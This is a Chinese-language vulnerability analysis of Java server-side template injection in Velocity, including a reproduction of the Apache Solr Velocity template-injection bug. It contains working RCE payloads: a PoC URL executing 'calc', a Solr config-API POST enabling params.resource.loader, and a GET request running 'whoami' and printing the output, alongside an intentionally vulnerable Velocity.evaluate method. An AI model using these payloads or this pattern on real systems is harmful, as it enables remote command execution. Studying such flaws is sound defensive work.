# 前言
**为什么说Java审计南在SSTI呢？**
  1. 现行SSTI(Server-Side Template Injection ) 资料不少，但与Java，以著名的先知社区为例（如下图所示），关于SSTI文章也不过几篇而已，但与Java相关的一篇都没有。  
  2. 搜索CVE漏洞有关于SSTI的漏洞编号也不过只有几个而已。  
  3. 如果你是一名老司机，已经挖过ssti漏洞，那你是否知道payload构造原理呢？本文为你解惑！老司机可以直接跳转到后记看本文，或者你只是想看payload构造原理亦如此，本文篇幅较长，建议先收藏。
* * *
# SSTI 服务端模板注入
ssti服务端模板注入，ssti主要为python的一些框架 jinja2、 mako tornado 、django，PHP框架smarty
twig，java框架FreeMarker、jade、
velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。
    // 漏洞源码
    private static void velocity(String template){
            Velocity.init();
            VelocityContext context = new VelocityContext();
            context.put("author", "Elliot A.");
            context.put("address", "217 E Broadway");
            context.put("phone", "555-1337");
            StringWriter swOut = new StringWriter();
            // 使用Velocity
            Velocity.evaluate(context, swOut, "test", template);
        }
**POC**  
`http://localhost:8080/ssti/velocity?template=%23set(%24e=%22e%22);%24e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22calc%22)`
* * *
## **漏洞分析**
    // Velocity.evaluate函数源码
    public static boolean evaluate(Context context, Writer out, String logTag, String instring) throws ParseErrorException, MethodInvocationException, ResourceNotFoundException {
            return RuntimeSingleton.getRuntimeServices().evaluate(context, out, logTag, instring);
        }
  * 设置断点开始调试
  * 进入Velocity.evaluate方法查看方法详情
    public static boolean evaluate(Context context, Writer out, String logTag, String instring) throws ParseErrorException, MethodInvocationException, ResourceNotFoundException {
            return RuntimeSingleton.getRuntimeServices().evaluate(context, out, logTag, instring);
        }
  * 继续跟进查看，这个就是Java最常见的get方法(初始化)。也是Java的特性之一封装性。
  * RuntimeInstance类中封装了evaluate方法，instring被强制转化(Reader)类型。
  * 进入StringReader看看
  * 在进入evaluate查看方法具体实现过程
    public boolean evaluate(Context context, Writer writer, String logTag, Reader reader) {
            if (logTag == null) {
                throw new NullPointerException("logTag (i.e. template name) cannot be null, you must provide an identifier for the content being evaluated");
            } else {
                SimpleNode nodeTree = null;
                try {
                // 来到这里进行解析
                    nodeTree = this.parse(reader, logTag);
                } catch (ParseException var7) {
                    throw new ParseErrorException(var7, (String)null);
                } catch (TemplateInitException var8) {
                    throw new ParseErrorException(var8, (String)null);
                }
               // 判断，然后进入this.render方法
                return nodeTree == null ? false : this.render(context, writer, logTag, nodeTree);
            }
        }
  * 继续跟进render方法
  * render方法里面还有一个render方法，真的是™烦。不过这个是simpleNodel类的render方法。
  * **高潮激情部分** ，由于前面两个没有什么用，让我们直接跳到第三个看，进入render方法。
  * 在这里我们不能发现有一个execute方法，这就是罪魁祸首。
  * 让我们进行跟进方法，由于是重构的execute方法，还是得看清楚点原理。
    // 截取的部分关键性源代码
    for(int i = 0; i < this.numChildren; ++i) {
                            if (this.strictRef && result == null) {
                                methodName = this.jjtGetChild(i).getFirstToken().image;
                                throw new VelocityException("Attempted to access '" + methodName + "' on a null value at " + Log.formatFileString(this.uberInfo.getTemplateName(), this.jjtGetChild(i).getLine(), this.jjtGetChild(i).getColumn()));
                            }
                            previousResult = result;
                            result = this.jjtGetChild(i).execute(result, context);
                            if (result == null && !this.strictRef) {
                                failedChild = i;
                                break;
                            }
                        }
  * 上面的for循环我就不说了它的作用了，我们焦点放在previousResult （之前的结果）和result上面。
  * previousResult = result;首先这行代码使其它们保持一致
  * 当遍历的节点时候，这时候就会一步步的保存我们的payload最终导致RCE  
  * 完整的效果展示  
  * 完整的调用链
* * *
# 案例分析 --- Apache solr Velocity 模版注入
## 漏洞复现
这个漏洞是去年10月底爆出的漏洞，这里只做必要的简单复现，笔者在这篇文章里主要是分析，更加完整的[漏洞复现过程](https://blog.csdn.net/sun1318578251/article/details/102843715)参考。
  1. 第一步修改配置，开启Velocity模版里`VelocityResponseWriter`初始化参数的`params.resource.loader.enabled`选项，该选项默认是`false`。查看[W3Cschool solr官方文档](https://www.w3cschool.cn/solr_doc/solr_doc-wcyd2hyj.html)可知，solr是配置api可以进行查看配置、修改配置的。
访问查看`http://127.0.0.1:8983/solr/test/config`配置信息  
    POST /solr/test/config HTTP/1.1
    Host: 127.0.0.1:8983
    Content-Type: application/json
    Content-Length: 259
    {
      "update-queryresponsewriter": {
        "startup": "lazy",
        "name": "velocity",
        "class": "solr.VelocityResponseWriter",
        "template.base.dir": "",
        "solr.resource.loader.enabled": "true",
        "params.resource.loader.enabled": "true"
      }
    }
* * *
    GET /solr/test/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1
    Host: 127.0.0.1:8983
* * *
## 漏洞分析环境搭建
笔者在此是使用远程代码调试的方式，分析源码。[源码下载地址](https://archive.apache.org/dist/lucene/solr/8.2.0/)windows用户可以选择下载这两个，这里笔者下载下载第二个。（下载第一个需要编译，过程自行百度）  
  1. 解压，将源码导入idea中，并配置idea中远程代码调试。  
  2. 在第二个下载压缩包路径CMD环境下（~~\solr-8.2.0\bin\），启动命令`solr start -p 8983 -f -a "-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8983"`  
  3. 用idea打开项目，导入jar文件设置为library。（还有几处在solr-8.2.0\contrib\velocity\lib、solr-8.2.0\server\lib......）  
  4. 打断点调试代码。分析一个web项目首先我们得看web.xml文件`E:\Soures\solr-8.2.0\server\solr-webapp\webapp\WEB-INF\web.xml`，看第一句，发现`在solrconfig.xml中注册的任何路径（名称）都将发送到该过滤器`。  
  5. 断点位置，为什么会在这里打个断点，笔者翻阅资料得知这里是核心位置。具体参考[solr源码阅读](https://my.oschina.net/haitaohu/blog/3078667)。  
* * *
## 漏洞成因分析 -- 代码层
### POC第一部分
第一部分分析请查看[Solr配置API：Config API](https://www.w3cschool.cn/solr_doc/solr_doc-wcyd2hyj.html)文档，文档中说明的很清楚。PS：漏洞复现的时候也有说明。  